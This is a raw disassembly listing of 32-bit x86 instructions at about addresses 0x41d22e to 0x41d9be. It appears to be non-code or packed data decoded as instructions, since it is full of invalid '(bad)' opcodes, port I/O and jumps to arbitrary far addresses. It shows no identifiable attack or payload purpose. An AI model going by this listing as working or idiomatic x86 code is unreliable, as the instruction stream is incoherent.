  41d22e:	repnz (bad) 
  41d230:	jb     0x41d1f5
  41d232:	mov    esp,DWORD PTR [eax+0x2054f61]
  41d238:	scas   al,BYTE PTR es:[edi]
  41d239:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d23a:	jmp    0x41d1e8
  41d23c:	pushf  
  41d23d:	ret    0x4e62
  41d240:	fnstenv [esi+esi*2-0x596b6a6c]
  41d247:	out    dx,al
  41d248:	in     eax,0x41
  41d24a:	add    edi,0xd1f25bd4
  41d250:	ja     0x41d292
  41d252:	das    
  41d253:	mov    al,ds:0x5ebe4a20
  41d258:	push   0xe2a2309b
  41d25d:	sahf   
  41d25e:	sbb    dl,ch
  41d260:	inc    edi
  41d261:	xor    bh,0x78
  41d264:	imul   edx,DWORD PTR [ecx-0x4],0x7d
  41d268:	xlat   BYTE PTR ds:[ebx]
  41d269:	in     eax,0xd7
  41d26b:	das    
  41d26c:	retf   
  41d26d:	aas    
  41d26e:	add    al,0xff
  41d270:	lods   al,BYTE PTR ds:[esi]
  41d271:	mov    ds:0xb3fb572,eax
  41d276:	cmp    al,0xe
  41d278:	inc    ebx
  41d279:	mov    esi,0x4ace1d9d
  41d27e:	arpl   WORD PTR [ebp-0x42],sp
  41d281:	or     edi,DWORD PTR [esi]
  41d283:	lods   eax,DWORD PTR ds:[esi]
  41d284:	cmp    ecx,DWORD PTR [edi-0x2fd4125a]
  41d28a:	dec    esi
  41d28b:	sub    ax,0x4622
  41d28f:	add    DWORD PTR [edi],ebp
  41d291:	add    BYTE PTR [eax+0x5ee1b75a],ah
  41d297:	add    al,0x84
  41d299:	das    
  41d29a:	out    dx,eax
  41d29b:	xchg   DWORD PTR [eiz*4+0x446d5ec4],eax
  41d2a2:	jae    0x41d255
  41d2a4:	test   BYTE PTR [edx],0x67
  41d2a7:	cmp    esi,DWORD PTR ds:[ecx+edi*2]
  41d2ab:	push   esi
  41d2ac:	xor    ebx,ecx
  41d2ae:	sti    
  41d2af:	ficomp WORD PTR [ebp-0x3de7bc3c]
  41d2b5:	imul   eax,DWORD PTR [edx],0xffffff81
  41d2b8:	ror    edx,cl
  41d2ba:	and    ebx,DWORD PTR [ebp+0x5d7eccb3]
  41d2c0:	or     BYTE PTR [ecx+0x341853d9],bl
  41d2c6:	jmp    0x7d5c6718
  41d2cb:	rol    BYTE PTR [edi+ebx*2-0x5a],0xdf
  41d2d0:	retf   
  41d2d1:	xchg   esp,eax
  41d2d2:	fidivr DWORD PTR [eax+0x44130875]
  41d2d8:	cmp    al,0x1b
  41d2da:	sbb    esi,DWORD PTR [edi+0x181a5fef]
  41d2e0:	retf   0xb285
  41d2e3:	scas   eax,DWORD PTR es:[edi]
  41d2e4:	cmp    eax,0x88ae43ea
  41d2e9:	fs or  eax,esp
  41d2ec:	jl     0x41d330
  41d2ee:	sbb    DWORD PTR [esi-0x5],eax
  41d2f1:	std    
  41d2f2:	(bad)  
  41d2f3:	mov    eax,0x70350f23
  41d2f8:	sbb    edi,ebp
  41d2fa:	add    eax,0x19f272c0
  41d2ff:	mov    edx,0x673d69d2
  41d304:	mov    ebp,0x89a4844b
  41d309:	fstp   TBYTE PTR [edi+0x16]
  41d30c:	mov    bl,0x2a
  41d30e:	jmp    0x2188:0x561bd35e
  41d315:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41d317:	jmp    0x1327:0x786d2d8c
  41d31e:	jp     0x41d375
  41d320:	sbb    al,BYTE PTR [ebx-0x117fe6a]
  41d326:	mov    ecx,0x1f4c5a99
  41d32b:	fiadd  WORD PTR [edx-0x68547746]
  41d331:	int3   
  41d332:	adc    DWORD PTR [ebx+ebx*8+0x13],esp
  41d336:	or     bh,ch
  41d338:	inc    esi
  41d339:	push   edi
  41d33a:	cmp    eax,0x1f01f8f8
  41d33f:	sbb    DWORD PTR [eax-0x54],0x3b2cef78
  41d346:	popf   
  41d347:	in     al,dx
  41d348:	dec    bh
  41d34a:	inc    ecx
  41d34b:	push   eax
  41d34c:	push   esp
  41d34d:	add    DWORD PTR [ebp+0x5a9dfbc],0x10
  41d354:	imul   eax,DWORD PTR [edi+0x46],0x21fd3009
  41d35b:	ds les eax,FWORD PTR es:[edx-0x2ad770f0]
  41d363:	dec    eax
  41d364:	nop
  41d365:	loop   0x41d3e6
  41d367:	fwait
  41d368:	jle    0x41d32b
  41d36a:	jo     0x41d3b8
  41d36c:	dec    edi
  41d36d:	sar    ebp,1
  41d36f:	xchg   DWORD PTR [edi-0x11430423],edx
  41d375:	jno    0x41d33f
  41d377:	xchg   edi,eax
  41d378:	arpl   WORD PTR [eax],bx
  41d37a:	inc    esp
  41d37b:	xchg   dx,ax
  41d37d:	popa   
  41d37e:	out    0xeb,al
  41d380:	push   edi
  41d381:	mov    cl,0x8d
  41d383:	ins    BYTE PTR es:[edi],dx
  41d384:	xchg   ebx,eax
  41d385:	jge    0x41d323
  41d387:	push   0xffffffa4
  41d389:	xor    al,0x2b
  41d38b:	mov    eax,ds:0x3a3e3733
  41d390:	ret    
  41d391:	cmp    eax,0xe7b43ab3
  41d396:	push   eax
  41d397:	xchg   edi,eax
  41d398:	jle    0x41d40e
  41d39a:	jb     0x41d384
  41d39c:	fs out dx,al
  41d39e:	xor    esi,DWORD PTR [edx-0x57bc8100]
  41d3a4:	js     0x41d3ec
  41d3a6:	push   es
  41d3a7:	dec    esi
  41d3a8:	adc    BYTE PTR [ebx],dl
  41d3aa:	ds jb  0x41d3bc
  41d3ad:	fs dec ebx
  41d3af:	cmp    DWORD PTR [ebx+0x30],0xaba48fb1
  41d3b6:	scas   al,BYTE PTR es:[edi]
  41d3b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3b8:	inc    esp
  41d3b9:	in     eax,dx
  41d3ba:	mov    WORD PTR [ebp+0x25],?
  41d3bd:	aaa    
  41d3be:	mov    esi,0x245e087e
  41d3c3:	aad    0x26
  41d3c5:	test   eax,0xe5791f38
  41d3ca:	push   ecx
  41d3cb:	add    esi,DWORD PTR [edx]
  41d3cd:	idiv   ebx
  41d3cf:	stos   DWORD PTR es:[edi],eax
  41d3d0:	shr    dh,0xcf
  41d3d3:	imul   esp,esi,0x7a088ee5
  41d3d9:	pop    ebx
  41d3da:	test   DWORD PTR [esi+0x66622806],ecx
  41d3e0:	and    eax,0xc3bc2852
  41d3e5:	sub    al,0xd2
  41d3e7:	jl     0x41d410
  41d3e9:	mov    ecx,0x3e0644e5
  41d3ee:	in     al,dx
  41d3ef:	cmp    BYTE PTR [ebp+0x7c],cl
  41d3f2:	mov    esi,0xdd4613ac
  41d3f7:	sub    ebp,DWORD PTR [edx+0x3a]
  41d3fa:	xor    eax,0xec93a6df
  41d3ff:	gs loopne 0x41d3d2
  41d402:	xlat   BYTE PTR ds:[ebx]
  41d403:	jb     0x41d3a4
  41d405:	cmp    ecx,DWORD PTR [edx+ebx*8]
  41d408:	mov    dh,0x6c
  41d40a:	mov    esi,0xaa00991e
  41d40f:	jmp    0xbc2e:0x7e4eea74
  41d416:	mov    al,ds:0x101d17f1
  41d41b:	add    bh,BYTE PTR [ebx+0x4663f4f1]
  41d421:	ins    DWORD PTR es:[edi],dx
  41d422:	fistp  QWORD PTR [ebx-0x1f4bdcb0]
  41d428:	lock xchg ecx,eax
  41d42a:	jle    0x41d416
  41d42c:	dec    esi
  41d42d:	mov    ds:0xd6dfb294,al
  41d432:	jecxz  0x41d41e
  41d434:	loope  0x41d3ff
  41d436:	jmp    0x68e3:0x7a51a06
  41d43d:	sub    DWORD PTR [esi-0x3e],eax
  41d440:	xchg   esi,eax
  41d441:	pop    esp
  41d442:	mov    dh,0xac
  41d444:	ret    
  41d445:	mov    dh,0xdc
  41d447:	cmc    
  41d448:	test   DWORD PTR [ecx],ecx
  41d44a:	call   0x7e68c2ad
  41d44f:	in     eax,0x5
  41d451:	addr16 inc edi
  41d453:	int    0xe9
  41d455:	in     eax,0xde
  41d457:	xlat   BYTE PTR ds:[ebx]
  41d458:	sbb    ah,BYTE PTR ds:0x93620151
  41d45e:	pop    esi
  41d45f:	sbb    DWORD PTR [ecx-0x3],edi
  41d462:	push   0xffffffe5
  41d464:	pop    esp
  41d465:	mov    eax,0x8e036658
  41d46a:	jg     0x41d4eb
  41d46c:	jecxz  0x41d424
  41d46e:	dec    esp
  41d46f:	addr16 cmp edx,edi
  41d472:	adc    cl,BYTE PTR [ebx+0x199b1f84]
  41d478:	and    esi,edx
  41d47a:	jecxz  0x41d4f6
  41d47c:	mov    bh,0xac
  41d47e:	mov    DWORD PTR [ebx+0x2a24f62f],esi
  41d484:	std    
  41d485:	mov    al,ds:0x622696ba
  41d48a:	lock and cl,BYTE PTR [edx+ebx*8+0x5]
  41d48f:	inc    edx
  41d490:	sbb    ah,ch
  41d492:	add    BYTE PTR [eax-0x33],dl
  41d495:	mov    esi,0x6f7e2e1b
  41d49a:	push   0xfffffff4
  41d49c:	fxch   st(6)
  41d49e:	ror    DWORD PTR [edx-0x4bad723a],cl
  41d4a4:	and    eax,0x6cbc09f3
  41d4a9:	add    eax,0x4b83b1bb
  41d4ae:	jo     0x41d477
  41d4b0:	scas   eax,DWORD PTR es:[edi]
  41d4b1:	mov    cl,0xdb
  41d4b3:	pop    ss
  41d4b4:	jae    0x41d4cc
  41d4b6:	shl    BYTE PTR [edx-0x7d],cl
  41d4b9:	xor    edx,DWORD PTR ds:0x9fce8b28
  41d4bf:	scas   eax,DWORD PTR es:[edi]
  41d4c0:	pushf  
  41d4c1:	jb     0x41d4cc
  41d4c3:	icebp  
  41d4c4:	xchg   edi,eax
  41d4c5:	les    eax,FWORD PTR [eax]
  41d4c7:	inc    ebp
  41d4c8:	adc    esi,ecx
  41d4ca:	retf   
  41d4cb:	inc    edi
  41d4cc:	mov    DWORD PTR ds:0xb3e57647,esp
  41d4d2:	repz mov al,0xc8
  41d4d5:	repnz mov eax,0x49a6397f
  41d4db:	test   al,0x52
  41d4dd:	adc    edx,eax
  41d4df:	dec    edx
  41d4e0:	scas   al,BYTE PTR es:[edi]
  41d4e1:	mov    eax,ds:0x8f7b00f2
  41d4e6:	xchg   BYTE PTR [ebp-0x78],ch
  41d4e9:	mov    cl,0x9a
  41d4eb:	mov    dl,0x61
  41d4ed:	adc    DWORD PTR ds:0xc5551d8c,eax
  41d4f3:	adc    BYTE PTR [esi+edi*8-0x19],cl
  41d4f7:	mov    ch,0x55
  41d4f9:	push   eax
  41d4fa:	sub    BYTE PTR [ebx],ah
  41d4fc:	lods   al,BYTE PTR ds:[esi]
  41d4fd:	retf   
  41d4fe:	cmp    BYTE PTR ss:[eax+0xf],dl
  41d502:	fst    st(2)
  41d504:	imul   ebp,DWORD PTR [esi],0xffffff80
  41d507:	xor    bh,0x8f
  41d50a:	push   ds
  41d50b:	in     al,0x78
  41d50d:	sahf   
  41d50e:	add    BYTE PTR [esi+0x68],ch
  41d511:	packssdw mm4,QWORD PTR [ebx-0x3632b899]
  41d518:	sub    DWORD PTR [esi],0xd3389ed3
  41d51e:	xor    ebp,DWORD PTR [eax+0x25f46987]
  41d524:	mov    ds:0xd5f5b4c0,eax
  41d529:	push   ds
  41d52a:	(bad)  
  41d52b:	data16 outs dx,BYTE PTR ds:[esi]
  41d52d:	nop
  41d52e:	inc    ecx
  41d52f:	sub    BYTE PTR [edx],0xfb
  41d532:	fdivr  DWORD PTR [esi+0x79]
  41d535:	fwait
  41d536:	add    eax,0xd3c0de69
  41d53b:	cwde   
  41d53c:	retf   0xf128
  41d53f:	daa    
  41d540:	ret    
  41d541:	mov    cl,0xb0
  41d543:	aad    0x1d
  41d545:	ja     0x41d4f5
  41d547:	mov    BYTE PTR [edx+eax*4+0x64],bh
  41d54b:	ins    BYTE PTR es:[edi],dx
  41d54c:	in     al,dx
  41d54d:	mov    cl,0xd3
  41d54f:	dec    esi
  41d550:	fs inc ebp
  41d552:	rol    al,1
  41d554:	int    0xd7
  41d556:	adc    DWORD PTR [eax+0x46],esp
  41d559:	mov    ebp,0xe8014823
  41d55e:	cld    
  41d55f:	(bad)  
  41d560:	xor    WORD PTR [esi-0x7a],bx
  41d564:	sbb    ebp,DWORD PTR ds:0x7b53c4
  41d56a:	cmp    DWORD PTR [ebx+0x14ab79c0],0xffffffdf
  41d571:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d572:	(bad)  
  41d573:	enter  0x22b3,0x93
  41d577:	push   esi
  41d578:	jg     0x41d502
  41d57a:	add    al,0xf5
  41d57c:	stos   BYTE PTR es:[edi],al
  41d57d:	or     eax,0xf36a2fc9
  41d582:	xchg   BYTE PTR [esi],bl
  41d584:	inc    edi
  41d585:	(bad)  
  41d586:	aad    0xc8
  41d588:	mov    BYTE PTR [ebx-0x28629451],dl
  41d58e:	inc    eax
  41d58f:	ret    
  41d590:	ja     0x41d543
  41d592:	add    eax,0x5ffa9b5a
  41d597:	in     al,dx
  41d598:	push   edx
  41d599:	xchg   esp,eax
  41d59a:	jne    0x41d52e
  41d59c:	and    al,0x46
  41d59e:	ja     0x41d5bc
  41d5a0:	xor    dl,dl
  41d5a2:	pop    esp
  41d5a3:	mov    esi,0x12e46d73
  41d5a8:	sbb    DWORD PTR [ebx+0x49],0x98345d4e
  41d5af:	mov    ch,0xb3
  41d5b1:	and    DWORD PTR [edi],0x76
  41d5b4:	out    0x8c,al
  41d5b6:	or     DWORD PTR [esi],ecx
  41d5b8:	sbb    DWORD PTR [edx],edi
  41d5ba:	pushf  
  41d5bb:	std    
  41d5bc:	das    
  41d5bd:	cmc    
  41d5be:	mov    edi,0xb658f539
  41d5c3:	arpl   WORD PTR [eax],si
  41d5c5:	xchg   ecx,eax
  41d5c6:	lea    esi,[ecx+0x1f]
  41d5c9:	icebp  
  41d5ca:	fnstsw WORD PTR [edx-0x419fdc09]
  41d5d0:	xchg   ebp,eax
  41d5d1:	mov    BYTE PTR [esi+0xd],bl
  41d5d4:	xor    DWORD PTR [ebx+0x13e33da2],ecx
  41d5da:	xchg   esp,eax
  41d5db:	lea    edx,[edx+0x29]
  41d5de:	or     dl,ah
  41d5e0:	(bad)  
  41d5e1:	mov    edx,0x1f8e188c
  41d5e6:	js     0x41d61d
  41d5e8:	or     DWORD PTR [ebx],esp
  41d5ea:	in     al,dx
  41d5eb:	and    DWORD PTR [esi-0x5792874d],ebp
  41d5f1:	ret    
  41d5f2:	inc    ebp
  41d5f3:	shl    BYTE PTR [ecx],1
  41d5f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5f6:	xor    ah,BYTE PTR [esp+ebp*1+0x677c56c0]
  41d5fd:	jns    0x41d622
  41d5ff:	cmp    ch,BYTE PTR [ebx]
  41d601:	idiv   DWORD PTR [ebx+0x64067f75]
  41d607:	mov    ecx,0x6b39e8a6
  41d60c:	cmp    ah,BYTE PTR [esi]
  41d60e:	sub    esp,eax
  41d610:	loope  0x41d678
  41d612:	jo     0x41d5cd
  41d614:	daa    
  41d615:	mov    ebp,0x67813960
  41d61a:	test   eax,0xee7677b5
  41d61f:	lock push esi
  41d621:	(bad)  
  41d622:	aam    0xee
  41d624:	push   ebp
  41d625:	cmp    bh,BYTE PTR [eax-0x60]
  41d628:	lods   al,BYTE PTR ds:[esi]
  41d629:	shr    edx,0xb2
  41d62c:	inc    ebx
  41d62d:	test   al,0x7a
  41d62f:	retf   
  41d630:	xchg   ecx,eax
  41d631:	xor    eax,0xd106b6c5
  41d636:	ss ins DWORD PTR es:[edi],dx
  41d638:	cmp    dl,cl
  41d63a:	arpl   sp,ax
  41d63c:	or     DWORD PTR [edi*4+0x4148c278],edx
  41d643:	outs   dx,DWORD PTR ds:[esi]
  41d644:	or     dl,bl
  41d646:	outs   dx,BYTE PTR ds:[esi]
  41d647:	je     0x41d5d1
  41d649:	in     eax,dx
  41d64a:	sub    DWORD PTR [ecx],esp
  41d64c:	xor    al,0xed
  41d64e:	pushf  
  41d64f:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41d651:	xlat   BYTE PTR ds:[ebx]
  41d652:	push   cs
  41d653:	scas   eax,DWORD PTR es:[edi]
  41d654:	mov    ch,0x99
  41d656:	jl     0x41d672
  41d658:	pop    es
  41d659:	ret    0x4d82
  41d65c:	jp     0x41d628
  41d65e:	push   ebx
  41d65f:	stos   BYTE PTR es:[edi],al
  41d660:	or     DWORD PTR [edi-0x269aff1c],0xffffff9e
  41d667:	dec    ecx
  41d668:	pop    ebp
  41d669:	dec    ebx
  41d66a:	clc    
  41d66b:	je     0x41d672
  41d66d:	test   DWORD PTR [ebp-0x1ef0e99f],edi
  41d673:	push   ds
  41d674:	jmp    0xee983b40
  41d679:	je     0x41d644
  41d67b:	xchg   esi,eax
  41d67c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d67d:	aas    
  41d67e:	sbb    al,0x97
  41d680:	add    eax,0x26355cef
  41d685:	xchg   dh,bl
  41d687:	int3   
  41d688:	jo     0x41d68a
  41d68a:	and    DWORD PTR [edi+esi*8+0x74611041],ebx
  41d691:	sub    eax,0x1b91aad8
  41d696:	jbe    0x41d6b2
  41d698:	lds    edi,FWORD PTR [edx+0x6a]
  41d69b:	(bad)  
  41d69d:	sub    al,0xdb
  41d69f:	inc    esi
  41d6a0:	pop    ecx
  41d6a1:	loopne 0x41d6a7
  41d6a3:	add    dh,BYTE PTR [ebp+0x3f]
  41d6a6:	arpl   WORD PTR [edi+0x76],dx
  41d6a9:	mov    ebx,0xaed62df4
  41d6ae:	cld    
  41d6af:	cmp    dh,al
  41d6b1:	cmp    BYTE PTR [edi+0x7de32fde],bl
  41d6b7:	int    0x76
  41d6b9:	adc    eax,0x38081665
  41d6be:	out    dx,eax
  41d6bf:	out    dx,eax
  41d6c0:	pop    edx
  41d6c1:	test   BYTE PTR [ebx+0x71],ch
  41d6c4:	sbb    esp,ebp
  41d6c6:	xchg   edx,eax
  41d6c7:	clc    
  41d6c8:	std    
  41d6c9:	cli    
  41d6ca:	retf   0x2703
  41d6cd:	rcr    BYTE PTR [edx-0xe],0xd
  41d6d1:	xlat   BYTE PTR ds:[ebx]
  41d6d2:	shl    BYTE PTR [eax],cl
  41d6d4:	dec    ebx
  41d6d5:	into   
  41d6d6:	mov    ebx,DWORD PTR [esi-0x1a3c1b36]
  41d6dc:	mov    ebp,0x2087ab3c
  41d6e1:	mov    ebx,0x2f460b1
  41d6e6:	jle    0x41d6ac
  41d6e8:	jmp    0x9baf:0xd52b69bd
  41d6ef:	mov    ch,0x16
  41d6f1:	loopne 0x41d6d6
  41d6f3:	nop
  41d6f4:	fild   WORD PTR [edi]
  41d6f6:	cli    
  41d6f7:	xchg   edx,eax
  41d6f8:	cmp    DWORD PTR [ecx],eax
  41d6fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6fb:	addr16 xchg esi,eax
  41d6fd:	dec    edx
  41d6fe:	fcmovbe st,st(7)
  41d700:	or     ecx,esi
  41d702:	in     eax,dx
  41d703:	clc    
  41d704:	xor    bl,BYTE PTR [ebx+0x412a59f3]
  41d70a:	xor    BYTE PTR [ebp+ebp*2-0x55],dl
  41d70e:	jmp    0x2b657cc1
  41d713:	dec    esi
  41d714:	leave  
  41d715:	test   eax,0x15a4d6e8
  41d71a:	cs mov bl,0x2e
  41d71d:	leave  
  41d71e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d71f:	jg     0x41d78f
  41d721:	push   ss
  41d722:	xor    DWORD PTR [edx-0x608c2f3f],esp
  41d728:	or     ecx,DWORD PTR ds:0xc1ea0622
  41d72e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d72f:	push   ds
  41d730:	mov    ch,0x3e
  41d732:	popf   
  41d733:	cdq    
  41d734:	pusha  
  41d735:	push   es
  41d736:	mov    cl,0xb6
  41d738:	out    0x24,eax
  41d73a:	imul   al
  41d73c:	and    eax,0x4f07ea78
  41d741:	call   0x12b6723a
  41d746:	popa   
  41d747:	mov    dh,0x27
  41d749:	rcr    BYTE PTR [edi],1
  41d74b:	push   es
  41d74c:	mov    DWORD PTR [edx+0x46],edi
  41d74f:	pusha  
  41d750:	lock lods eax,DWORD PTR ds:[esi]
  41d753:	cmc    
  41d754:	in     al,dx
  41d755:	sbb    ch,al
  41d757:	add    edi,ebx
  41d759:	repnz leave 
  41d75b:	int    0x72
  41d75d:	dec    ebx
  41d75e:	mov    al,BYTE PTR [ebx+0x3d]
  41d761:	int    0x7c
  41d763:	cmp    eax,0x30218559
  41d768:	arpl   WORD PTR [esi-0x28],si
  41d76b:	fcmovnbe st,st(1)
  41d76d:	pop    ebx
  41d76e:	iret   
  41d76f:	jmp    0x8bd5:0xa5d1e89b
  41d776:	aas    
  41d777:	dec    ecx
  41d778:	jge    0x41d7ac
  41d77a:	dec    esi
  41d77b:	daa    
  41d77c:	push   ds
  41d77d:	and    ah,bh
  41d77f:	sbb    ecx,DWORD PTR [edx]
  41d781:	rcl    DWORD PTR [esi-0x70f59034],0xa7
  41d788:	aam    0x85
  41d78a:	das    
  41d78b:	stos   DWORD PTR es:[edi],eax
  41d78c:	dec    esp
  41d78d:	cmp    ecx,ebx
  41d78f:	sub    eax,0xa34e7cd
  41d794:	dec    ebx
  41d795:	dec    ecx
  41d796:	mov    dh,0x10
  41d798:	out    dx,eax
  41d799:	in     eax,0xd2
  41d79b:	sub    ebx,DWORD PTR [edi+0x72bd6e77]
  41d7a1:	aaa    
  41d7a2:	loopne 0x41d7ba
  41d7a4:	adc    cl,BYTE PTR ds:0xd5aae697
  41d7aa:	imul   ebp,esp,0xffffffdc
  41d7ad:	xchg   esi,eax
  41d7ae:	pop    esp
  41d7af:	sbb    eax,0xc93127f8
  41d7b4:	push   esp
  41d7b5:	mov    dh,0x3d
  41d7b7:	dec    eax
  41d7b8:	pop    edi
  41d7b9:	mov    dh,BYTE PTR [ebp-0x1509aacd]
  41d7bf:	test   al,0xa0
  41d7c1:	je     0x41d838
  41d7c3:	pop    edx
  41d7c4:	clc    
  41d7c5:	xchg   BYTE PTR [ebx+0x70b4be39],dl
  41d7cb:	test   eax,0x987c1c8f
  41d7d0:	jl     0x41d836
  41d7d2:	jle    0x41d807
  41d7d4:	and    eax,0x462fa86d
  41d7d9:	enter  0x4bb3,0x51
  41d7dd:	aam    0x38
  41d7df:	leave  
  41d7e0:	ret    
  41d7e1:	aam    0x5
  41d7e3:	iret   
  41d7e4:	mov    BYTE PTR [edx-0x758c0783],cl
  41d7ea:	mov    eax,0x850eb8ec
  41d7ef:	and    ch,bl
  41d7f1:	mov    eax,0x6ca07cbb
  41d7f6:	f2xm1  
  41d7f8:	mov    ebx,0x215e13a2
  41d7fd:	xor    BYTE PTR [ecx+0x2aa371b1],dh
  41d803:	dec    ebp
  41d804:	std    
  41d805:	iret   
  41d806:	lahf   
  41d807:	sahf   
  41d808:	mov    cl,0x69
  41d80a:	or     eax,ebx
  41d80c:	aaa    
  41d80d:	mov    al,ds:0x152db116
  41d812:	add    esp,0xa9f7a2de
  41d818:	mov    eax,0x2b60f22f
  41d81d:	pop    ebx
  41d81e:	mov    cl,0x33
  41d820:	and    dl,bh
  41d822:	sar    DWORD PTR [esi-0x6f],1
  41d825:	sahf   
  41d826:	das    
  41d827:	pop    ds
  41d828:	xor    edx,DWORD PTR [ebx-0x80]
  41d82b:	sahf   
  41d82c:	mov    ah,0x74
  41d82e:	ja     0x41d85b
  41d830:	mul    DWORD PTR [edx+ebx*4]
  41d833:	(bad)  
  41d835:	pushf  
  41d836:	bound  esi,QWORD PTR [esi]
  41d838:	cmp    DWORD PTR [ebx-0x34f83c9c],eax
  41d83e:	repz shl BYTE PTR [eax],1
  41d841:	loope  0x41d86d
  41d843:	mov    esi,0xafb6486a
  41d848:	fbld   TBYTE PTR [edx-0x18]
  41d84b:	and    DWORD PTR [ecx+0x3d],eax
  41d84e:	push   ebx
  41d84f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d850:	in     al,dx
  41d851:	pop    esi
  41d852:	mov    ds:0x18019035,eax
  41d857:	daa    
  41d858:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d859:	dec    ebp
  41d85a:	in     eax,0xb7
  41d85c:	stos   BYTE PTR es:[edi],al
  41d85d:	pop    es
  41d85e:	clc    
  41d85f:	mov    ecx,0xa9eb2942
  41d864:	repz fs int3 
  41d867:	rcl    bh,cl
  41d869:	test   DWORD PTR [ebp-0x7a],0x4b868a3b
  41d870:	adc    cl,BYTE PTR [edi]
  41d872:	dec    ecx
  41d873:	clc    
  41d874:	cmovs  esp,DWORD PTR [edx+0x6111fb1c]
  41d87b:	dec    edx
  41d87c:	jle    0x41d8e7
  41d87e:	out    0x71,eax
  41d880:	sbb    dl,BYTE PTR [ebx+0x64]
  41d883:	ret    
  41d884:	jae    0x41d8bf
  41d886:	xchg   edi,eax
  41d887:	lahf   
  41d888:	sti    
  41d889:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d88a:	xbegin 0x37b5dc72
  41d890:	aam    0xf1
  41d892:	cmp    al,BYTE PTR [edi+0x35b59f39]
  41d898:	jecxz  0x41d8f1
  41d89a:	or     ebp,esp
  41d89c:	or     al,0x77
  41d89e:	xchg   ecx,edx
  41d8a0:	in     al,dx
  41d8a1:	jnp    0x41d88c
  41d8a3:	loopne 0x41d8c8
  41d8a5:	lea    esi,[ebx-0x7c]
  41d8a8:	and    al,0xdc
  41d8aa:	xchg   edi,eax
  41d8ab:	(bad)  
  41d8ac:	adc    al,BYTE PTR [edx]
  41d8ae:	xchg   edi,eax
  41d8af:	jmp    0x5688:0x2d627bca
  41d8b6:	out    dx,al
  41d8b7:	(bad)  
  41d8b8:	int    0x82
  41d8ba:	sub    BYTE PTR [edx+0x65d009e0],ah
  41d8c0:	jp     0x41d91d
  41d8c2:	dec    esp
  41d8c3:	mov    eax,ds:0xc12a3e3d
  41d8c8:	aad    0x4d
  41d8ca:	dec    esp
  41d8cb:	pop    ebp
  41d8cc:	mov    esp,0x90a000ef
  41d8d1:	dec    edx
  41d8d2:	imul   esp,DWORD PTR [ecx],0x42c94678
  41d8d8:	xchg   ecx,eax
  41d8d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8da:	mov    al,ss:0x82b40894
  41d8e0:	mov    edi,0x3d29dbe1
  41d8e5:	pusha  
  41d8e6:	jbe    0x41d8dd
  41d8e8:	fstp   QWORD PTR [ecx-0x4a]
  41d8eb:	int    0x6b
  41d8ed:	sahf   
  41d8ee:	test   eax,0x50a971c6
  41d8f3:	xchg   edi,eax
  41d8f4:	xor    dh,bh
  41d8f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8f7:	mov    DWORD PTR [ebx-0xb],0xa9c4fa27
  41d8fe:	hlt    
  41d8ff:	retf   
  41d900:	xchg   edi,eax
  41d901:	sub    eax,0x50ec4124
  41d906:	js     0x41d980
  41d908:	mov    edi,0xc8ad4300
  41d90d:	add    al,al
  41d90f:	into   
  41d910:	sbb    eax,0xd9849188
  41d915:	test   BYTE PTR [ebp+0x730d828],al
  41d91b:	and    edi,DWORD PTR [edi+0x76]
  41d91e:	mov    ebx,DWORD PTR [ecx]
  41d920:	pop    ebx
  41d921:	mov    edx,0x595720a4
  41d926:	lods   eax,DWORD PTR ds:[esi]
  41d927:	leave  
  41d928:	xor    eax,DWORD PTR cs:[ebx-0x2d]
  41d92c:	xchg   esp,eax
  41d92d:	sbb    ecx,ebp
  41d92f:	sub    eax,0xed881b5e
  41d934:	addr16 fs int 0xbf
  41d938:	outs   dx,DWORD PTR ds:[esi]
  41d939:	enter  0x679e,0x93
  41d93d:	xchg   ebx,eax
  41d93e:	jb     0x41d91b
  41d940:	int3   
  41d941:	cmc    
  41d942:	fidiv  WORD PTR [esi+edx*4]
  41d945:	scas   al,BYTE PTR es:[edi]
  41d946:	lods   eax,DWORD PTR ds:[esi]
  41d947:	jmp    0xf82:0xe9247444
  41d94e:	loope  0x41d8d7
  41d950:	sbb    DWORD PTR [esi+0x6801f723],ebx
  41d956:	pop    ecx
  41d957:	arpl   WORD PTR [edx+0x1e],bp
  41d95a:	push   es
  41d95b:	jae    0x41d921
  41d95d:	scas   eax,DWORD PTR es:[edi]
  41d95e:	pop    eax
  41d95f:	xchg   edx,eax
  41d960:	aas    
  41d961:	push   0x4a02b7b2
  41d966:	jae    0x41d97a
  41d968:	ja     0x41d97b
  41d96a:	sbb    eax,0xf598cb84
  41d96f:	jae    0x41d9e0
  41d971:	das    
  41d972:	mov    ebp,0x802b4e9f
  41d977:	and    ah,BYTE PTR [eax-0x613bd5a9]
  41d97d:	add    al,0x85
  41d97f:	jo     0x41d90e
  41d981:	xor    DWORD PTR [ecx],edx
  41d983:	ins    DWORD PTR es:[edi],dx
  41d984:	push   ecx
  41d985:	cmp    eax,0x510d3dbe
  41d98a:	nop
  41d98b:	jmp    0x92856087
  41d990:	std    
  41d991:	aad    0xaf
  41d993:	inc    BYTE PTR [ebx]
  41d995:	and    BYTE PTR [edi],al
  41d997:	adc    DWORD PTR [eax-0x67b1cb9f],esp
  41d99d:	rcr    DWORD PTR [edi+0x3],0xca
  41d9a1:	std    
  41d9a2:	push   edi
  41d9a3:	out    0xf8,al
  41d9a5:	push   ecx
  41d9a6:	or     dl,BYTE PTR [edx]
  41d9a8:	aam    0xa5
  41d9aa:	mov    ch,0xc8
  41d9ac:	xor    bh,0x40
  41d9af:	ret    
  41d9b0:	les    ebx,FWORD PTR [edx+0x65dafa6c]
  41d9b6:	cmp    esp,edx
  41d9b8:	ucomiss xmm0,xmm3
  41d9bb:	in     al,0x85
  41d9bd:	ret    
  41d9be:	add    DWORD PTR [esi+0x38],ecx
